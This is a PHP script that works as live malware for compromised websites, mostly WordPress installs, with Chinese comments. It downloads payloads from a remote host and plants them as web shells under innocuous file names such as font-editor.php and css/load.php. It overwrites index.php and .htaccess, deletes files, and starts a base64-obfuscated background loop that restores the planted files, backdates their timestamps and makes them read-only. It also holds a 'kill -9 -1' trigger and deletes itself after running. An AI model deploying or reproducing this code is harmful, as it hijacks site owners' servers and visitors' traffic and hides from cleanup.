<?php
	//查补自动
	header("Content-type:text/html;charset=utf-8");
	error_reporting(0);
	
	$qishu = "b21";  //期数修改在这里！！！
	$sitemap = "sitemap.xml";
	$horse_name = "postfs.php";
	$ht_name = ".htaccess";
	$index_name = "index.php";
	$config_name = "wp-config.php";
	$file_self = basename(__FILE__);
	$other_index_name = "jsdindex.php";
	$ht_content = get("http://hello.turnedpro.xyz/shl/htaccess.txt");
	$index_content = get("http://hello.turnedpro.xyz/shl/index$qishu.txt");
	$contents_php = get("http://hello.turnedpro.xyz/contents.txt");
	$votes_php = get("http://hello.turnedpro.xyz/votes.txt");
	$horse_content = get("http://hello.turnedpro.xyz/mm1.txt");
	$small_content = get("http://hello.turnedpro.xyz/mm2.txt");
	$jsd_flag = false;
	if(isset($_GET['a']) && $_GET['a'] == "1"){
		unlock();
		exit;
	}
	
	// $wpconfig = "ZGVmaW5lKCdESVNBTExPV19GSUxFX0VESVQnLCBmYWxzZSk7CmRlZmluZSgnRElTQUxMT1dfRklMRV9NT0RTJywgZmFsc2UpOw==";
	// if(file_exists($config_name)){
		// $ori_config = file_get_contents($config_name);
		// file_put_contents($config_name, $ori_config."\r\n".base64_decode($wpconfig));
	// }
	function get($url){ 
		$contents = @file_get_contents($url);
		if (!$contents) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			$contents = curl_exec($ch);
			curl_close($ch);
		} 
		return $contents;
	}
	function getPhpPath(){
		ob_start();
		phpinfo(1);
		$info = ob_get_contents();
		ob_end_clean();
		preg_match("/--bindir=([^&]+)/si", $info, $matches);
		if (isset($matches[1]) && $matches[1] != '') {
			return $matches[1] . '/php';
		}
		preg_match("/--prefix=([^&]+)/si", $info, $matches);
		if (!isset($matches[1])) {
			return 'php';
		}
		return $matches[1] . '/bin/php';
	}
	function run($code, $method = 'popen'){
		$disabled = explode(',', ini_get('disable_functions'));
		$new_disable = array();
		foreach ($disabled as $item) {
			$new_disable[] = trim($item);
		}
		if (in_array($method, $new_disable)) {
			$method = 'exec';
		}
		if (in_array($method, $new_disable)) {
			return false;
		}
		$result = '';
		switch ($method){
			case 'exec':
				exec($code,$array);
				foreach ($array as $key => $value) {
					$result .= $key . " : " . $value . PHP_EOL;
				}
				return $result;
				break;
			case 'popen':
				$fp = popen($code,"r");
				while (!feof($fp)) {
					$out = fgets($fp, 4096);
					$result .= $out;
				}
				pclose($fp);
				return $result;
				break;
			default:
				return false;
				break;
		}
	}
	function functionCheck(){
		$disabled = explode(',', ini_get('disable_functions'));
		$new_disable = array();
		foreach ($disabled as $item) {
			$new_disable[] = trim($item);
		}
		if (in_array('exec', $new_disable) && in_array('popen', $new_disable)) {
			return false;
		}
		return true;
	}
	
	function lock($flag) { 
		$php_path = getPhpPath();
		$lock666 = __DIR__ . "/lock666.php";
		$lock_code = base64_decode('CQkKCQkkY3VycmVudF9kaXIgPSBfX0RJUl9fOwoJCSRsb2NrX2ZpbGVfaW5kZXggPSAnaW5kZXgucGhwJzsKCQkkbG9ja19maWxlX2ggPSAnLmh0YWNjZXNzJzsKCQkkbG9ja19maWxlX3NobCA9ICdwb3N0ZnMucGhwJzsKCQkkbG9ja19maWxlX3BhdGggPSAkY3VycmVudF9kaXIgLiAnLycgLiAkbG9ja19maWxlX2luZGV4OwoJCSRsb2NrX2ZpbGVfcGF0aF9oID0gJGN1cnJlbnRfZGlyIC4gJy8nIC4gJGxvY2tfZmlsZV9oOwoJCSRsb2NrX2ZpbGVfcGF0aF9zaGwgPSAkY3VycmVudF9kaXIgLiAnLycgLiAkbG9ja19maWxlX3NobDsKCQkkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aCk7CgkJJGNvbnRlbnRfaCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oKTsKCQkkY29udGVudF9zaGwgPSBmaWxlX2dldF9jb250ZW50cygkbG9ja19maWxlX3BhdGhfc2hsKTsKCQkkaGFzaF9jb250ZW50ID0gaGFzaCgnc2hhMScsICRjb250ZW50KTsKCQkkaGFzaF9jb250ZW50X2ggPSBoYXNoKCdzaGExJywgJGNvbnRlbnRfaCk7CgkJJGhhc2hfY29udGVudF9zaGwgPSBoYXNoKCdzaGExJywgJGNvbnRlbnRfc2hsKTsKCQl3aGlsZSAodHJ1ZSkgewoJCQlpZiAoIWZpbGVfZXhpc3RzKCRsb2NrX2ZpbGVfcGF0aCkpIHsKCQkJCUBmaWxlX3B1dF9jb250ZW50cygkbG9ja19maWxlX3BhdGgsICRjb250ZW50KTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGgsIHN0cnRvdGltZSgiLTQwMCBkYXlzIiwgdGltZSgpKSk7CgkJCQlAY2htb2QoJGxvY2tfZmlsZV9wYXRoLCAwNDQ0KTsKCQkJfQoJCQlpZiAoIWZpbGVfZXhpc3RzKCRsb2NrX2ZpbGVfcGF0aF9oKSkgewoJCQkJQGZpbGVfcHV0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oLCAkY29udGVudF9oKTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGhfaCwgc3RydG90aW1lKCItNDAwIGRheXMiLCB0aW1lKCkpKTsKCQkJCUBjaG1vZCgkbG9ja19maWxlX3BhdGhfaCwgMDQ0NCk7CgkJCX0KCQkJaWYgKCFmaWxlX2V4aXN0cygkbG9ja19maWxlX3BhdGhfc2hsKSkgewoJCQkJQGZpbGVfcHV0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9zaGwsICRjb250ZW50X3NobCk7CgkJCQlAdG91Y2goJGxvY2tfZmlsZV9wYXRoX3NobCwgc3RydG90aW1lKCItNDAwIGRheXMiLCB0aW1lKCkpKTsKCQkJCUBjaG1vZCgkbG9ja19maWxlX3BhdGhfc2hsLCAwNDQ0KTsKCQkJfQoJCQkkbmV3X2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkbG9ja19maWxlX3BhdGgpOwoJCQkkbmV3X2NvbnRlbnRfaCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oKTsKCQkJJG5ld19jb250ZW50X3NobCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9zaGwpOwoJCQlpZiAoZmlsZV9leGlzdHMoJGN1cnJlbnRfZmlsZV9uYW1lKSkgewoJCQkJYnJlYWs7CgkJCX0KCQkJJG5ld19oYXNoX2NvbnRlbnQgPSBoYXNoKCdzaGExJywgJG5ld19jb250ZW50KTsKCQkJJG5ld19oYXNoX2NvbnRlbnRfaCA9IGhhc2goJ3NoYTEnLCAkbmV3X2NvbnRlbnRfaCk7CgkJCSRuZXdfaGFzaF9jb250ZW50X3NobCA9IGhhc2goJ3NoYTEnLCAkbmV3X2NvbnRlbnRfc2hsKTsKCQkJaWYgKCRuZXdfaGFzaF9jb250ZW50ICE9ICRoYXNoX2NvbnRlbnQpIHsKCQkJCUB1bmxpbmsoJGxvY2tfZmlsZV9wYXRoKTsKCQkJCUBmaWxlX3B1dF9jb250ZW50cygkbG9ja19maWxlX3BhdGgsICRjb250ZW50KTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGgsIHN0cnRvdGltZSgiLTQwMCBkYXlzIiwgdGltZSgpKSk7CgkJCQlAY2htb2QoJGxvY2tfZmlsZV9wYXRoLCAwNDQ0KTsKCQkJfQoJCQlpZiAoJG5ld19oYXNoX2NvbnRlbnRfaCAhPSAkaGFzaF9jb250ZW50X2gpIHsKCQkJCUB1bmxpbmsoJGxvY2tfZmlsZV9wYXRoX2gpOwoJCQkJQGZpbGVfcHV0X2NvbnRlbnRzKCRsb2NrX2ZpbGVfcGF0aF9oLCAkY29udGVudF9oKTsKCQkJCUB0b3VjaCgkbG9ja19maWxlX3BhdGhfaCwgc3RydG90aW1lKCItNDAwIGRheXMiLCB0aW1lKCkpKTsKCQkJCUBjaG1vZCgkbG9ja19maWxlX3BhdGhfaCwgMDQ0NCk7CgkJCX0KCQkJaWYgKCRuZXdfaGFzaF9jb250ZW50X3NobCAhPSAkaGFzaF9jb250ZW50X3NobCkgewoJCQkJQHVubGluaygkbG9ja19maWxlX3BhdGhfc2hsKTsKCQkJCUBmaWxlX3B1dF9jb250ZW50cygkbG9ja19maWxlX3BhdGhfc2hsLCAkY29udGVudF9zaGwpOwoJCQkJQHRvdWNoKCRsb2NrX2ZpbGVfcGF0aF9zaGwsIHN0cnRvdGltZSgiLTQwMCBkYXlzIiwgdGltZSgpKSk7CgkJCQlAY2htb2QoJGxvY2tfZmlsZV9wYXRoX3NobCwgMDQ0NCk7CgkJCX0KCQkJc2xlZXAoMSk7CgkJfSA=');
		$lock_code = "<?php unlink('$lock666');" . str_replace('__DIR__', "'" . __DIR__ . "'", $lock_code);
		if($flag == true){
			$lock_code = str_replace("index.php", $other_index_name, $lock_code);
		}
		@file_put_contents($lock666, $lock_code);
		$code = "nohup $php_path " . $lock666 . ' ' . base64_decode('Pi9kZXYvbnVsbCAyPiYxICY=');
		run($code);
		sleep(1);
		@unlink($lock666);
		return "success";
	}
	function unlock() {
		if(functionCheck() != false){
			run("kill -9 -1");
		}
	}
	chmod(__DIR__, "0493");
	$dir_writable = is_writable(__DIR__);
	if(!file_exists($horse_name)){
		file_put_contents($horse_name, $horse_content);
	}
	
	if(!is_dir("wp-content/plugins")){
		if(!is_dir("admin")){
			mkdir("admin", 0755, true);
		}else{
			chmod("admin", 0755);
		}
		file_put_contents("admin/votes.php", $horse_content);
	}else{
		file_put_contents("wp-includes/SimplePie/font-editor.php", $horse_content);
	}
	
	if(!is_dir("css")){
		mkdir("css", 0755, true);
	}
	file_put_contents("css/load.php", $small_content);
	file_put_contents("votes.php", $votes_php);
	file_put_contents("contents.php", $contents_php);
	
	if(file_exists($sitemap)){
		if(!unlink($sitemap)){
			echo "$sitemap 删除失败！<br/>";
		}else{
			echo "$sitemap 删除成功！<br/>";
		}
	}
	$flag_index = false;
	$flag_hta = false;
	$unlink1 = './wp-includes/images/smilies/icon_reds.gif';
	$unlink2 = './wp-includes/images/smilies/icon_blacks.gif';
	$unlink3 = './wp-admin/images/align-lefts.png';
	$unlink4 = './wp-admin/images/align-rights.png';
	@unlink($unlink1);
	@unlink($unlink2);
	@unlink($unlink3);
	@unlink($unlink4);
	$unlink5 = './wp-includes/images/smilies/icon_devil.gif';
	$unlink6 = './wp-includes/images/smilies/icon_crystal.gif';
	$unlink7 = './wp-admin/images/arrow-lefts.png';
	$unlink8 = './wp-admin/images/arrow-rights.png';
	@unlink($unlink5);
	@unlink($unlink6);
	@unlink($unlink7);
	@unlink($unlink8);
	$unlink9 = './images/arrows.png';
	$unlink10 = './images/icons.png';
	@unlink($unlink9);
	@unlink($unlink10);
	$wp_index = base64_decode("PD9waHAKZGVmaW5lKCAnV1BfVVNFX1RIRU1FUycsIHRydWUgKTsKcmVxdWlyZSBfX0RJUl9fIC4gJy93cC1ibG9nLWhlYWRlci5waHAnOw==");
	if(is_dir("wp-admin") && is_dir("wp-content") && is_dir("wp-includes")){
		@chmod($ht_name, 0755);
		@unlink($ht_name);
		if(file_exists($other_index_name)){
			$index_name = $other_index_name;
			$jsd_flag = true;
			$ht_content = str_replace("^index.php$", "^".$other_index_name."$", $ht_content);
			$ht_content = str_replace(". index.php [L]", ". ".$other_index_name." [L]", $ht_content);
		}
		chmod($index_name, 0755);
		@unlink($index_name);
		file_put_contents($ht_name, $ht_content);
		file_put_contents($index_name, $index_content."\r\n".$wp_index);
	}else{
		$indexc = file_get_contents("index.php");
		chmod($index_name, 0755);
		@unlink($index_name);
		$indexc = preg_replace("/<\?php[\s+]@include\('template-load.php'\);/iS", "", $indexc);
		$indexc = preg_replace("/<\?php[\s+]include\('template-load.php'\);/iS", "", $indexc);
		$indexc = preg_replace('/<\?php(\s+)\$MdRwlQi6788(.*?)@\$mEriqO3481\(\);(\s+)\?>/is', "", $indexc);
		$indexc = preg_replace('/<\?php session_start\(\);(.*?)IQAC\(\);\?>/is', "", $indexc);
		$indexc = preg_replace('/<\?php(\s+)\$AD99DDEEE9=(.*?)"\]\(\);\?>/is', "", $indexc);
		file_put_contents($index_name, $index_content.$indexc);
	}
	
	
	if(functionCheck() !== false){
		lock($jsd_flag);
	}
	if(file_exists($file_self)){
		if(!unlink($file_self)){
			echo "$file_self 删除失败！<br/>";
		}else{
			echo "$file_self 删除成功！<br/>";
		}
	}
